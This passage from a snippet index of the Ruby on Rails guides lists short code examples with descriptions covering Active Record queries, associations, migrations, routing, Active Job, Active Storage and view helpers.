BirthdayCake.create\nCongratulations, the callback has run!\n```\n\n----------------------------------------\n\nTITLE: Creating Entry Objects with Delegated Types in Rails\nDESCRIPTION: Shows how to create a new Entry object while specifying its entryable subclass. This demonstrates the object creation pattern when using delegated types in Rails.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_89\n\nLANGUAGE: ruby\nCODE:\n```\nEntry.create! entryable: Message.new(subject: \"hello!\")\n```\n\n----------------------------------------\n\nTITLE: Forcing Reload of has_one Association - Ruby\nDESCRIPTION: Reloads the Account association for the Supplier instance from the database. Bypasses any cached instance and returns the latest associated record. Uses Rails' reload_association method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_27\n\nLANGUAGE: ruby\nCODE:\n```\n@account = @supplier.reload_account\n```\n\n----------------------------------------\n\nTITLE: Using Only to Override Conditions in Active Record (Ruby)\nDESCRIPTION: This snippet demonstrates how to use the `only` method to override existing conditions in an Active Record query, specifically keeping only the `order` and `where` clauses.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_106\n\nLANGUAGE: ruby\nCODE:\n```\nBook.where(\"id > 10\").limit(20).order(\"id desc\").only(:order, :where)\n```\n\n----------------------------------------\n\nTITLE: Setting queue name delimiter in application.rb\nDESCRIPTION: This snippet shows how to configure the queue name delimiter using `config.active_job.queue_name_delimiter` in `application.rb`.  It sets the delimiter to \".\" instead of the default \"_\".\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_26\n\nLANGUAGE: ruby\nCODE:\n```\n# config/application.rb\nmodule YourApp\n  class Application < Rails::Application\n    config.active_job.queue_name_prefix = Rails.env\n    config.active_job.queue_name_delimiter = \".\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Installing All Engine Migrations (Bash)\nDESCRIPTION: Copies pending database migrations from *all* engines listed in the `Gemfile` into the host application's `db/migrate` directory using the generic `railties:install:migrations` Rake task.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_31\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails railties:install:migrations\n```\n\n----------------------------------------\n\nTITLE: JavaScript Module Dependency Management\nDESCRIPTION: Example showing how to use ES6 modules to manage JavaScript dependencies explicitly when using Propshaft, which doesn't handle dependency resolution automatically.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/asset_pipeline.md#2025-04-23_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\n// main.js\nimport { initUtilities } from \"./utilities.js\";\nimport { setupFeature } from \"./feature.js\";\n\ninitUtilities();\nsetupFeature();\n```\n\n----------------------------------------\n\nTITLE: Routing with Path using Scope in Rails\nDESCRIPTION: This snippet shows how to route a path to a controller without the corresponding module prefix using the `scope` block in Rails. It maps the `/admin/articles` path to the `ArticlesController` without the `Admin::` module prefix.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\nscope \"/admin\" do\n  resources :articles\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nresources :articles, path: \"/admin/articles\"\n```\n\n----------------------------------------\n\nTITLE: Reordering with Active Record (Ruby)\nDESCRIPTION: This snippet demonstrates how to use the `reorder` method to override the default scope order of a relation. In this case, it reorders the books associated with an author.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_113\n\nLANGUAGE: ruby\nCODE:\n```\nclass Author < ApplicationRecord\n  has_many :books, -> { order(year_published: :desc) }\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nAuthor.find(10).books\n```\n\n----------------------------------------\n\nTITLE: Removing a Foreign Key (Infer Column)\nDESCRIPTION: This code removes a foreign key constraint using `remove_foreign_key`. Active Record infers the column name based on table names. In this case, it removes the foreign key between `accounts` and `branches`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_51\n\nLANGUAGE: ruby\nCODE:\n```\nremove_foreign_key :accounts, :branches\n```\n\n----------------------------------------\n\nTITLE: Disabling Authenticity Token in Rails Form (ERB)\nDESCRIPTION: This code demonstrates how to disable the authenticity token in a Rails form when posting to an external resource. This is useful when the external API doesn't require or accept the token.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_88\n\nLANGUAGE: erb\nCODE:\n```\n<%= form_with url: 'http://farfar.away/form', authenticity_token: false do %>\n  Form contents\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Generating Image Tag with HTML Options in Rails\nDESCRIPTION: This code snippet demonstrates how to use the `image_tag` helper with HTML options in Rails to generate an HTML `<img>` tag. It sets the `height` attribute of the `<img>` tag to 45.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_55\n\nLANGUAGE: erb\nCODE:\n```\n<%= image_tag \"icons/delete.gif\", {height: 45} %>\n```\n\n----------------------------------------\n\nTITLE: Conditional Logic with yes? or no?\nDESCRIPTION: Demonstrates how to use conditional logic based on user input using the `yes?` and `no?` methods. The example prompts the user to run database migrations.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/rails_application_templates.md#_snippet_16\n\nLANGUAGE: ruby\nCODE:\n```\nrails_command(\"db:migrate\") if yes?(\"Run database migrations?\")\n# no?(question) acts just the opposite.\n```\n\n----------------------------------------\n\nTITLE: Configuring Legacy Connection Handling in Rails 6.1\nDESCRIPTION: Configuration setting for enabling per-database connection switching in Rails 6.1. When set to false, allows switching connections for individual databases using connected_to on abstract classes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/6_1_release_notes.md#2025-04-23_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.active_record.legacy_connection_handling = false\n```\n\n----------------------------------------\n\nTITLE: Creating Paths with Single Magazine Object - Ruby/ERB\nDESCRIPTION: This snippet creates a link to the magazine details page by passing only the `@magazine` object to the `link_to` helper. Rails automatically generates the path based on the object.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_24\n\nLANGUAGE: erb\nCODE:\n```\n<%= link_to 'Magazine details', @magazine %>\n```\n\n----------------------------------------\n\nTITLE: Tableizing Strings\nDESCRIPTION: Demonstrates the `tableize` method, which is a combination of `underscore` and `pluralize`. It converts a class name into its corresponding table name.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_80\n\nLANGUAGE: ruby\nCODE:\n```\n\"Person\".tableize      # => \"people\"\n\"Invoice\".tableize     # => \"invoices\"\n\"InvoiceLine\".tableize # => \"invoice_lines\"\n```\n\n----------------------------------------\n\nTITLE: Configuring Active Storage Services in YAML\nDESCRIPTION: Example YAML configuration for local, test, and Amazon S3 storage services in config/storage.yml.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nlocal:\n  service: Disk\n  root: <%= Rails.root.join(\"storage\") %>\n\ntest:\n  service: Disk\n  root: <%= Rails.root.join(\"tmp/storage\") %>\n\namazon:\n  service: S3\n  access_key_id: <%= Rails.application.credentials.dig(:aws, :access_key_id) %>\n  secret_access_key: <%= Rails.application.credentials.dig(:aws, :secret_access_key) %>\n  bucket: your_own_bucket-<%= Rails.env %>\n  region: \"\" # e.g. 'us-east-1'\n```\n\n----------------------------------------\n\nTITLE: Creating Initializers with initializer\nDESCRIPTION: Demonstrates how to add an initializer to the generated application's `config/initializers` directory using the `initializer` method. The example creates an initializer with custom Ruby code.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/rails_application_templates.md#_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\ninitializer \"bloatlol.rb\", <<-CODE\n  class Object\n    def not_nil?\n      !nil?\n    end\n\n    def not_blank?\n      !blank?\n    end\n  end\nCODE\n```\n\n----------------------------------------\n\nTITLE: Registering Error Subscribers in a Rails Railtie\nDESCRIPTION: Shows how error-reporting libraries can register their subscribers in a Rails Railtie. This ensures the subscriber is properly initialized when the Rails application starts.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/error_reporting.md#2025-04-23_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\nmodule MySdk\n  class Railtie < ::Rails::Railtie\n    initializer \"my_sdk.error_subscribe\" do\n      Rails.error.subscribe(MyErrorSubscriber.new)\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Setting the queue for ActiveJob\nDESCRIPTION: This snippet shows how to schedule a job to run on a specific queue using `queue_as` within an ActiveJob class. The `GuestsCleanupJob` will be executed on the `low_priority` queue.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_23\n\nLANGUAGE: ruby\nCODE:\n```\nclass GuestsCleanupJob < ApplicationJob\n  queue_as :low_priority\n  # ...\nend\n```\n\n----------------------------------------\n\nTITLE: Formatting Phone Numbers with number_to_phone in Ruby\nDESCRIPTION: Shows how to use the number_to_phone helper to format a number into a phone number (US format by default).\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\nnumber_to_phone(1235551234) # => 123-555-1234\n```\n\n----------------------------------------\n\nTITLE: EXPLAIN Output Example for PostgreSQL\nDESCRIPTION: This is an example of the output generated by the `explain` command in PostgreSQL. It shows a different format compared to MySQL/MariaDB, displaying the query plan in a tree-like structure.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_211\n\nLANGUAGE: sql\nCODE:\n```\nEXPLAIN SELECT \"customers\".* FROM \"customers\" INNER JOIN \"orders\" ON \"orders\".\"customer_id\" = \"customers\".\"id\" WHERE \"customers\".\"id\" = $1 [[\"id\", 1]]\n                                  QUERY PLAN\n------------------------------------------------------------------------------\n Nested Loop  (cost=4.33..20.85 rows=4 width=164)\n    ->  Index Scan using customers_pkey on customers  (cost=0.15..8.17 rows=1 width=164)\n          Index Cond: (id = '1'::bigint)\n    ->  Bitmap Heap Scan on orders  (cost=4.18..12.64 rows=4 width=8)\n          Recheck Cond: (customer_id = '1'::bigint)\n          ->  Bitmap Index Scan on index_orders_on_customer_id  (cost=0.00..4.18 rows=4 width=0)\n                Index Cond: (customer_id = '1'::bigint)\n(7 rows)\n```\n\n----------------------------------------\n\nTITLE: Humanize String in full_messages\nDESCRIPTION: Shows how `humanize` method is used within `full_messages` to provide attribute names for error messages.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_86\n\nLANGUAGE: ruby\nCODE:\n```\ndef full_messages\n  map { |attribute, message| full_message(attribute, message) }\nend\n\ndef full_message\n  # ...\n  attr_name = attribute.to_s.tr(\".\", \"_\").humanize\n  attr_name = @base.class.human_attribute_name(attribute, default: attr_name)\n  # ...\nend\n```\n\n----------------------------------------\n\nTITLE: HTML output of select box bound to model object\nDESCRIPTION: This HTML shows the generated select box, automatically selecting the option that matches the `@person`'s `city` attribute value (MD for Madrid).\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_40\n\nLANGUAGE: html\nCODE:\n```\n<select name=\"person[city]\" id=\"person_city\">\n  <option value=\"BE\">Berlin</option>\n  <option value=\"CHI\">Chicago</option>\n  <option value=\"MD\" selected=\"selected\">Madrid</option>\n</select>\n```\n\n----------------------------------------\n\nTITLE: Classifying Strings\nDESCRIPTION: Illustrates the `classify` method, which converts a table name to its corresponding class name. It's the inverse of `tableize`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_81\n\nLANGUAGE: ruby\nCODE:\n```\n\"people\".classify        # => \"Person\"\n\"invoices\".classify      # => \"Invoice\"\n\"invoice_lines\".classify # => \"InvoiceLine\"\n\n\"highrise_production.companies\".classify # => \"Company\"\n```\n\n----------------------------------------\n\nTITLE: Generated HTML for Custom HTTP Method Link\nDESCRIPTION: This snippet shows the resulting HTML output from the link_to helper with a custom HTTP method specified.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/working_with_javascript_in_rails.md#2025-04-23_snippet_12\n\nLANGUAGE: html\nCODE:\n```\n<a data-turbo-method=\"delete\" href=\"...\">Delete post</a>\n```\n\n----------------------------------------\n\nTITLE: Using to_yaml with simple_format in Rails Views\nDESCRIPTION: Shows how to convert an object to YAML format and apply simple_format helper to format the output. This achieves similar results to the debug helper but allows for more customization.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/debugging_rails_applications.md#2025-04-23_snippet_1\n\nLANGUAGE: html+erb\nCODE:\n```\n<%= simple_format @article.to_yaml %>\n<p>\n  <b>Title:</b>\n  <%= @article.title %>\n</p>\n```\n\n----------------------------------------\n\nTITLE: Setting Up Turbo Stream WebSocket in ERB\nDESCRIPTION: Example of setting up a WebSocket connection for Turbo Streams in an ERB template.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/working_with_javascript_in_rails.md#2025-04-23_snippet_10\n\nLANGUAGE: erb\nCODE:\n```\n<%= turbo_stream_from \"posts\" %>\n```\n\n----------------------------------------\n\nTITLE: Merging Relations with Unscope in Active Record (Ruby)\nDESCRIPTION: This snippet demonstrates how a relation that has used `unscope` affects any relation into which it is merged. In this case, the `order` clause is removed from the merged relation.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_104\n\nLANGUAGE: ruby\nCODE:\n```\nBook.order(\"id desc\").merge(Book.unscope(:order))\n```\n\n----------------------------------------\n\nTITLE: Creating a New Record Instance\nDESCRIPTION: This command creates a new instance of the `Product` model with the specified attributes, but it does not yet save the record to the database. It sets the `name` attribute to 'T-Shirt'.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_13\n\nLANGUAGE: irb\nCODE:\n```\nstore(dev)> product = Product.new(name: \"T-Shirt\")\n```\n\n----------------------------------------\n\nTITLE: Requiring External Engine Dependencies Before Initialization\nDESCRIPTION: Shows how to require other engine dependencies before your engine's initialization. This pattern ensures dependent engines are loaded in the correct order.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_66\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"other_engine/engine\"\nrequire \"yet_another_engine/engine\"\n\nmodule MyEngine\n  class Engine < ::Rails::Engine\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Querying ActiveRecord Models in Ruby\nDESCRIPTION: This snippet demonstrates various ways to query ActiveRecord models, including 'all', 'first', 'last', 'take', 'find_by', and 'find'.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_basics.md#2025-04-23_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\nbooks = Book.all\n\nfirst_book = Book.first\nlast_book = Book.last\nbook = Book.take\n\nbook = Book.find_by(title: \"Metaprogramming Ruby 2\")\n\nbook = Book.find(42)\n```\n\n----------------------------------------\n\nTITLE: Configuring ShardSelector for a Specific Connection Class\nDESCRIPTION: Configuration example that tells the ShardSelector middleware to switch shards using a specific abstract connection class (AnimalsRecord) instead of the default ActiveRecord::Base.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_multiple_databases.md#2025-04-23_snippet_27\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.active_record.shard_selector = { lock: true, class_name: \"AnimalsRecord\" }\n```\n\n----------------------------------------\n\nTITLE: Using where.missing in Rails\nDESCRIPTION: This snippet demonstrates how to use `where.missing` to select records based on the absence of an association. It retrieves all customers that have not made any reviews.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_148\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.where.missing(:reviews)\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT customers.* FROM customers\nLEFT OUTER JOIN reviews ON reviews.customer_id = customers.id\nWHERE reviews.id IS NULL\n```\n\n----------------------------------------\n\nTITLE: Configure Redirect Filtering in Rails\nDESCRIPTION: This snippet demonstrates how to filter redirect URLs in Rails application logs to prevent sensitive URLs from being exposed. It adds strings and regular expressions to the `filter_redirect` array.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\nRails.application.config.filter_redirect += [\"s3.amazonaws.com\", /private-match/]\n```\n\n----------------------------------------\n\nTITLE: Defining Has and Belongs to Many Association in Ruby on Rails\nDESCRIPTION: Example of setting up a has_and_belongs_to_many association between Assembly and Part models, where each assembly can contain many parts and each part can be used in many assemblies.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_46\n\nLANGUAGE: ruby\nCODE:\n```\nclass Assembly < ApplicationRecord\n  has_and_belongs_to_many :parts\nend\n\nclass Part < ApplicationRecord\n  has_and_belongs_to_many :assemblies\nend\n```\n\n----------------------------------------\n\nTITLE: Reloading Rails Environment\nDESCRIPTION: This snippet shows how to reload the Rails environment in the console. This is necessary after making changes to the code, such as adding validations, to ensure that the changes are reflected in the console.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_31\n\nLANGUAGE: irb\nCODE:\n```\nstore(dev)> reload!\nReloading...\n```\n\n----------------------------------------\n\nTITLE: Configuring Rails Secrets\nDESCRIPTION: Example of secrets.yml configuration file for storing application secrets and API keys.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_1_release_notes.md#2025-04-23_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\ndevelopment:\n  secret_key_base: 3b7cd727ee24e8444053437c36cc66c3\n  some_api_key: SOMEKEY\n```\n\n----------------------------------------\n\nTITLE: Accessing Book Attributes in Ruby on Rails Console\nDESCRIPTION: This snippet shows how to create a new Book instance and access its attributes in the Rails console using IRB.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_basics.md#2025-04-23_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\nirb> book = Book.new\n=> #<Book:0x00007fbdf5e9a038 id: nil, title: nil, author: nil, created_at: nil, updated_at: nil>\n\nirb> book.title = \"The Hobbit\"\n=> \"The Hobbit\"\nirb> book.title\n=> \"The Hobbit\"\n```\n\n----------------------------------------\n\nTITLE: Controller Path Generation with Underscore\nDESCRIPTION: This code demonstrates how Rails uses the `underscore` method to generate the controller path from the controller class name. The path is obtained by removing 'Controller' suffix and underscoring the class name.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_72\n\nLANGUAGE: ruby\nCODE:\n```\ndef controller_path\n  @controller_path ||= name.delete_suffix(\"Controller\").underscore\nend\n```\n\n----------------------------------------\n\nTITLE: Internationalized HomeController with Translation Keys\nDESCRIPTION: The updated HomeController implementation that uses the Rails translation helper (t) to abstract the flash message text into a translation key.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_16\n\nLANGUAGE: ruby\nCODE:\n```\n# app/controllers/home_controller.rb\nclass HomeController < ApplicationController\n  def index\n    flash[:notice] = t(:hello_flash)\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Setting and Accessing Cookies in Rails Controller Tests (Ruby)\nDESCRIPTION: Shows how to set and access cookies in Rails controller tests using the new syntax. It also demonstrates how to clear cookies between tests.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_2_release_notes.md#2025-04-23_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\ncookies[:email] = 'user@example.com'\nget :index\nassert_equal 'user@example.com', cookies[:email]\n\ncookies.clear\nget :index\nassert_nil cookies[:email]\n```\n\n----------------------------------------\n\nTITLE: Generating Model with Attachments in Rails 6.0+\nDESCRIPTION: Shows how to generate a model with attachments using the Rails model generator command for Rails 6.0 and newer versions. This command creates a Message model with images attachments.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_26\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate model Message images:attachments\n```\n\n----------------------------------------\n\nTITLE: Truncate Words with Regex Separator\nDESCRIPTION: This snippet truncates a string after a specified number of words, using a regular expression as a separator to find the break point.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_51\n\nLANGUAGE: ruby\nCODE:\n```\n\"Oh dear! Oh dear! I shall be late!\".truncate_words(4, separator: /\\s/)\n# => \"Oh dear! Oh dear!...\"\n```\n\n----------------------------------------\n\nTITLE: Deconstantizing Strings\nDESCRIPTION: Illustrates the `deconstantize` method, which removes the rightmost segment from a qualified constant reference expression, leaving the container name.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_78\n\nLANGUAGE: ruby\nCODE:\n```\n\"Product\".deconstantize                        # => \"\"\n\"Backoffice::UsersController\".deconstantize    # => \"Backoffice\"\n\"Admin::Hotel::ReservationUtils\".deconstantize # => \"Admin::Hotel\"\n```\n\n----------------------------------------\n\nTITLE: Creating Database Tables for Authors and Books in Ruby on Rails\nDESCRIPTION: This migration creates tables for authors and books, setting up a basic structure without using associations.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_0\n\nLANGUAGE: Ruby\nCODE:\n```\nclass CreateAuthors < ActiveRecord::Migration[8.1]\n  def change\n    create_table :authors do |t|\n      t.string :name\n      t.timestamps\n    end\n\n    create_table :books do |t|\n      t.references :author\n      t.datetime :published_at\n      t.timestamps\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Generating a Create Table Migration (Bash)\nDESCRIPTION: This command generates a migration to create a 'products' table with 'name' and 'part_number' columns as strings. The migration includes the create_table block with column definitions and timestamps.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate migration CreateProducts name:string part_number:string\n```\n\n----------------------------------------\n\nTITLE: Running Rails Update Task in Ruby\nDESCRIPTION: This snippet demonstrates how to run the Rails update task using the command line. The task helps with creating new files and updating existing ones during the upgrade process.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails app:update\n```\n\n----------------------------------------\n\nTITLE: Registering Action Mailer Observers in Ruby\nDESCRIPTION: This code snippet registers an observer, `MailObserver`, which will be notified when mail is delivered. Observers can be used to perform actions such as logging or auditing mail delivery.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_60\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.action_mailer.observers = [\"MailObserver\"]\n```\n\n----------------------------------------\n\nTITLE: Model Structure for Delegated Types in Rails\nDESCRIPTION: Shows the basic model structure for implementing delegated types with Entry as the superclass and Message and Comment as delegated models.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_85\n\nLANGUAGE: ruby\nCODE:\n```\n# Schema: entries[ id, entryable_type, entryable_id, created_at, updated_at ]\nclass Entry < ApplicationRecord\nend\n\n# Schema: messages[ id, subject, body, created_at, updated_at ]\nclass Message < ApplicationRecord\nend\n\n# Schema: comments[ id, content, created_at, updated_at ]\nclass Comment < ApplicationRecord\nend\n```\n\n----------------------------------------\n\nTITLE: Rendering a Collection with a Layout\nDESCRIPTION: Shows how to render a collection of items with a layout. The layout is rendered for each item in the collection, and the current object and object_counter variables are available within the layout.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_46\n\nLANGUAGE: erb\nCODE:\n```\n<%= render partial: \"article\", collection: @articles, layout: \"special_layout\" %>\n```\n\n----------------------------------------\n\nTITLE: Matching All HTTP Verbs (Ruby)\nDESCRIPTION: Matches all HTTP verbs to the `show` action of the `PhotosController` using the `match` method and the `via: :all` option. This is generally discouraged due to security implications.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_40\n\nLANGUAGE: ruby\nCODE:\n```\nmatch \"photos\", to: \"photos#show\", via: :all\n```\n\n----------------------------------------\n\nTITLE: Migration for Many-to-Many Relationship\nDESCRIPTION: Database migration for setting up tables required for many-to-many relationship with appointments as join table.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_44\n\nLANGUAGE: ruby\nCODE:\n```\nclass CreateAppointments < ActiveRecord::Migration[8.1]\n  def change\n    create_table :physicians do |t|\n      t.string :name\n      t.timestamps\n    end\n\n    create_table :patients do |t|\n      t.string :name\n      t.timestamps\n    end\n\n    create_table :appointments do |t|\n      t.belongs_to :physician\n      t.belongs_to :patient\n      t.datetime :appointment_date\n      t.timestamps\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Rails Version Check\nDESCRIPTION: This command displays the currently installed version of Rails. It is used to verify that the correct version is installed before starting a new project. It expects Rails to be installed and accessible in the system's PATH.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ rails --version\n```\n\n----------------------------------------\n\nTITLE: Filtering a Has and Belongs to Many Collection with Where Conditions in Rails\nDESCRIPTION: Example of using the where method to find assemblies within a part's collection that match specific conditions, using lazy loading.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_56\n\nLANGUAGE: ruby\nCODE:\n```\n@new_assemblies = @part.assemblies.where(\"created_at > ?\", 2.days.ago)\n```\n\n----------------------------------------\n\nTITLE: Commenting Out JSON Root Element Configuration in Ruby\nDESCRIPTION: Illustrates how to remove or comment out the configuration for including the root element in JSON, as it's no longer necessary in Rails 4.0 due to changed defaults.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_92\n\nLANGUAGE: ruby\nCODE:\n```\n# Disable root element in JSON by default.\n# ActiveSupport.on_load(:active_record) do\n#   self.include_root_in_json = false\n# end\n```\n\n----------------------------------------\n\nTITLE: Configuring Action Cable WebSocket and Logger Adapters\nDESCRIPTION: This snippet demonstrates the changes in configuring WebSocket and logger adapters for Action Cable in Rails 6. The configuration properties have been moved to ActionCable.adapters.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_31\n\nLANGUAGE: javascript\nCODE:\n```\n-    ActionCable.WebSocket = MyWebSocket\n+    ActionCable.adapters.WebSocket = MyWebSocket\n\n-    ActionCable.logger = myLogger\n+    ActionCable.adapters.logger = myLogger\n```\n\n----------------------------------------\n\nTITLE: In Stock HTML Email Template (ERB)\nDESCRIPTION: This code snippet defines the HTML content for the `in_stock` email. It includes a heading and a link to the product page.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_108\n\nLANGUAGE: erb\nCODE:\n```\n<h1>Good news!</h1>\n\n<p><%= link_to @product.name, product_url(@product) %> is back in stock.</p>\n```\n\n----------------------------------------\n\nTITLE: Overriding the STI Inheritance Column in Rails\nDESCRIPTION: Shows how to customize the column used for tracking the model type in Single Table Inheritance by setting the inheritance_column.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_81\n\nLANGUAGE: ruby\nCODE:\n```\n# Schema: vehicles[ id, kind, created_at, updated_at ]\nclass Vehicle < ApplicationRecord\n  self.inheritance_column = \"kind\"\nend\n\nclass Car < Vehicle\nend\n\nCar.create\n# => #<Car kind: \"Car\", color: \"Red\", price: 10000>\n```\n\n----------------------------------------\n\nTITLE: YAML Fixture with Associations - Action Text\nDESCRIPTION: This YAML fixture defines a rich text content for an article named 'first'. It illustrates how to set up a `record` association in the Action Text fixture.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_26\n\nLANGUAGE: yaml\nCODE:\n```\n# test/fixtures/action_text/rich_texts.yml\nfirst_content:\n  record: first (Article)\n  name: content\n  body: <div>Hello, from <strong>a fixture</strong></div>\n```\n\n----------------------------------------\n\nTITLE: Running Database Migration (Rails)\nDESCRIPTION: This command executes pending database migrations, applying the changes defined in the migration files (e.g., adding the inventory_count column). It uses the `rails db:migrate` command.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_95\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails db:migrate\n```\n\n----------------------------------------\n\nTITLE: Implementing ActiveRecord Store for Key/Value Storage\nDESCRIPTION: Demonstrates how to use ActiveRecord::Base.store for declaring simple single-column key/value stores with accessors.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_2_release_notes.md#2025-04-23_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ActiveRecord::Base\n  store :settings, accessors: [ :color, :homepage ]\nend\n\nu = User.new(color: 'black', homepage: '37signals.com')\nu.color                          # Accessor stored attribute\nu.settings[:country] = 'Denmark' # Any attribute, even if not specified with an accessor\n```\n\n----------------------------------------\n\nTITLE: Specifying Custom Timestamp with Touch Option\nDESCRIPTION: Shows how to use the :touch option with a specific timestamp column name. This allows updating a custom timestamp attribute instead of the default updated_at column.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_112\n\nLANGUAGE: ruby\nCODE:\n```\nclass Book < ApplicationRecord\n  belongs_to :author, touch: :books_updated_at\nend\n```\n\n----------------------------------------\n\nTITLE: Routing with Module using Scope in Rails\nDESCRIPTION: This snippet demonstrates routing to a controller within a module using the `scope` block in Rails. It maps the `/articles` path to the `Admin::ArticlesController` without including the `/admin` prefix in the URL.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\nscope module: \"admin\" do\n  resources :articles\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nresources :articles, module: 